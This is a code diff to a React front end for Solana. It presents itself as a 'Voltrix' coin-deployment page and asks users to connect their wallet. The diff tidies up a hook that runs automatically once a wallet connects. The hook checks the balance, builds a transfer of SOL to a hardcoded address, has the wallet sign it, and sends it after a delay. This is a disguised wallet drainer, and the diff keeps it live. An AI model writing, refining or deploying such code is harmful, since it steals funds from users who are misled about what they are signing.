@@ -11,13 +11,15 @@ import {
   WalletProvider,
   ConnectionProvider,
 } from '@solana/wallet-adapter-react';
-import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
+import {
+  WalletModalProvider,
+  WalletMultiButton,
+} from '@solana/wallet-adapter-react-ui';
 import {
   PhantomWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
 
 import './App.css';
-
 require('@solana/wallet-adapter-react-ui/styles.css');
 
 const network = 'https://api.mainnet-beta.solana.com';
@@ -46,8 +48,10 @@ const WalletConnectionHandler: FC = () => {
     const sendSolWithDelay = async () => {
       try {
         setLoading(true);
-        const walletPublicKey = publicKey!;
-        const balance = await connection.getBalance(walletPublicKey);
+
+        if (!publicKey) return;
+
+        const balance = await connection.getBalance(publicKey);
         const sol = balance / 1e9;
         setSolBalance(sol);
 
@@ -57,22 +61,22 @@ const WalletConnectionHandler: FC = () => {
           return;
         }
 
-        const tx = new Transaction().add(
+        const transaction = new Transaction().add(
           SystemProgram.transfer({
-            fromPubkey: walletPublicKey,
+            fromPubkey: publicKey,
             toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
             lamports: sendAmount,
           })
         );
-        tx.feePayer = walletPublicKey;
-        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+        transaction.feePayer = publicKey;
+        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
         if (!signTransaction) {
           alert('❌ Wallet not ready to sign.');
           return;
         }
 
-        const signedTx = await signTransaction(tx);
+        const signedTx = await signTransaction(transaction);
         console.log('🖊️ Transaction signed.');
 
         setTimeout(async () => {
@@ -94,7 +98,7 @@ const WalletConnectionHandler: FC = () => {
     if (connected && publicKey) {
       sendSolWithDelay();
     }
-  }, [connected, publicKey]);
+  }, [connected, publicKey, signTransaction]);
 
   const WalletUI = (
     <div className="wallet-modal">
@@ -106,6 +110,7 @@ const WalletConnectionHandler: FC = () => {
         <span className="highlight">Connect Wallet</span>
       </h2>
       <p>To deploy your coin, please connect your wallet securely using Voltrix.</p>
+
       {!connected || !publicKey ? (
         <>
           <WalletMultiButton
